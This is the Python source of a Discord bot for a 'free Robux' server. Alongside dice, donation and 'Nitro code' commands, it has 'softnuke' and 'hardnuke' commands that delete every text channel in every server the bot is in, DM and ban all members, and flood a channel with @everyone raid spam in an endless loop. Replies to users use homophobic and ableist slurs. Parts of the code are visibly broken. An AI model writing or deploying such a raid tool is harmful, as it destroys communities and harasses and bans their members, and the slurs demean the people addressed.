# bot.py
import os
import discord
from dotenv import load_dotenv
from discord.ext import commands
import random
import asyncio

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
GUILD = os.getenv('DISCORD_GUILD')

client = discord.Client()

bot = commands.Bot(command_prefix='.')


@client.event
async def on_ready():
    guild = discord.utils.get(client.guilds, name=GUILD)
    print(
        f'{client.user} is connected to the following guild:\n'
        f'{guild.name}(id: {guild.id})'
    )


@bot.event
async def on_member_join(member):
    await member.create_dm()
    await member.dm_channel.send(
        f'Hi @' + str({member.name}) + ', welcome to MZ FreeRobux! We hope you have a good time here!'
    )


@bot.command(name='dw', help='Responds how a drop works.')
async def drop(ctx):
    response = """**How does a drop work?**
    -> Every drop usually lasts for a short time!
    -> The winner of the drop gets 10-30 seconds to DM the host!"""
    await ctx.send(response)


@bot.command(name='meme', help='[BROKEN RN] Pulls a meme from Dank Memer... but why are you using this command?!')
async def plsmeme(ctx):
    response = "Not functional rn. But just use DankMemer's `pls meme`..."

    await ctx.send(response)


@bot.command(name='-.', help='.-.')
async def dotdashdot(ctx):
    response = ".-. .-. .-. .-. .-. .-. .-. .-. .-. .-."

    await ctx.send(response)


@bot.command(name='donate', help='Fund our development!')
async def donate(ctx):
    response = """To donate, you may buy any gamepass from https://www.roblox.com/games/6742216868/MuzhenGamingYTs-Place#!/store :)
    OR <@762152955382071316>'s NITRO IS ENDING SOON, PLS DONATE HIM SOME NITRO IN HIS DMS PLS PLS PLS😭😭"""

    await ctx.send(response)


@bot.command(name='dice', help="""Rolls an imaginary, non-existent die.
Usage: `.dice <number of dice> <number of sides>`""")
async def rolldice(ctx, number_of_dice: int, number_of_sides: int):
    dice = [
        str(random.choice(range(1, number_of_sides + 1)))
        for _ in range(number_of_dice)
    ]
    await ctx.send(', '.join(dice))


@bot.command(name='credits', help='Shows some surprising credits.')
async def credits(ctx):
    response = """Credits to:
    <@762152955382071316> and NO ONE ELSE."""

    await ctx.send(response)


@bot.command(name='nitro', help='Generates a random... Nitro code?!')
async def nitrogen(ctx):
    genlist = str(open('nitrogenlist.txt', 'r').read())
    genlistsplit = genlist.split("\n")

    response = str(random.choice(genlistsplit))

    await ctx.send(response)


@bot.command(name='shutdown', help='WTF... SHUTDOWN THE BOT?!! NO!!! NO!!!')
async def on_message(message):
    if str(message.author.id) != '762152955382071316':
        print(str(message.author.id), "Tried to shutdown the bot by using .shutdown")
        await message.send("LOL Only <@762152955382071316> can shutdown the bot, get lost\n**YOU GAY**")
    else:
        await message.send("NOOOOO MASTER...\n`Shutdown Executed Successfully`")
        exit()


@bot.command(name='mute', help='Mutes someone.')
async def mute(ctx, member: discord.Member, *, reason=None):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to mute", member, "by using .mute")
        await ctx.send("LOL ONLY <@762152955382071316> can mute someone, get lost noob\n**YOU GAY**")
    else:
        guild = ctx.guild
        mutedrole = discord.utils.get(guild.roles, name="Muted")
        await member.add_roles(mutedrole, reason=reason)
        await ctx.send(f"**HEHE**\n`Muted User:{member} Successfully`")


@bot.command(name='unmute', help='Unmutes someone.')
async def unmute(ctx, member: discord.Member):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to unmute", member, "by using .unmute")
        await ctx.send("LOL ONLY <@762152955382071316> can unmute someone, get lost noob\n**YOU GAY**")
    else:
        mutedrole = discord.utils.get(ctx.guild.roles, name="Muted")
        await member.remove_roles(mutedrole)
        await ctx.send(f"**WELCOME BACK**\n`Unmuted User: {member} Successfully`")


@bot.command(name='nuke', help='Nukes this channel... Yep.')
async def nuke_channel(ctx):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to nuke channel:", ctx.channel, "by using .nuke")
        await ctx.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
    else:
        channelpos = ctx.channel.position
        new_channel = await ctx.channel.clone()
        await new_channel.send(f"Nuked `{ctx.channel}` Successfully!")
        await ctx.channel.delete()
        await new_channel.edit(position=channelpos)


@bot.command(name='softnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!!')
async def nuke_server_fr(ctx):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .softnuke_server")
        await ctx.send(
            "LOL ONLY <@762152955382071316> can nuke THE ENTIRE SERVER ||(and why would he)||, get lost noob\n**YOU FUCKING RETARD**")
    else:
        async def nuke_channel_2(txt):
            if str(txt.author.id) != '762152955382071316':
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
            else:
                text_channel_list = []
                for guild in bot.guilds:
                    for channel in guild.text_channels:
                        text_channel_list.append(channel)

                for channel in text_channel_list:
                    await channel.delete()

        await nuke_channel_2(ctx)


@bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
async def nuke_server_fr(ctx):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
        await ctx.send(
            "LOL ONLY <@762152955382071316> can nuke THE ENTIRE SERVER ||(and why would he)||, get lost noob\n**YOU FUCKING RETARD**")
    else:

        all_members_list = []

        for guild in bot.guilds:
            for membertemp in guild.members:
                all_members_list.append(membertemp)

        async def nuke_channel_2(txt):
            if str(txt.author.id) != '762152955382071316':
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
            else:
                try:
                    text_channel_list = []
                    for guild1 in bot.guilds:
                        for channel in guild1.text_channels:
                            text_channel_list.append(channel)

                    for channel in text_channel_list:
                        await channel.delete()

                except:
                    None

                finally:
                    None

        await nuke_channel_2(ctx)

        async def create_random_channels(txt2):
            if str(txt2.author.id) != '762152955382071316':
                print(str(txt2.author.id), "Tried to nuke channel:", txt2.channel, "by using .nuke")
                await txt2.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
            else:
                guild = txt2.message.guild
                for i in range(69):
                    guild.create_text_channel(name='raided-bitch')
        await create_random_channels()
        
        guild = ctx.message.guild
        newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')

        for member in all_members_list:
            try:
                await member.send(f'GG Noob! One of your servers {guild.name} got RAIDED and you were BANNED '
                                  f'lol\nJoin https://discord.gg/uAsCWzkNZd')
                await member.ban()
            except:
                None
            finally:
                None

        while True:
            await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
                                  'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
#ban part broken for now




bot.run(TOKEN)
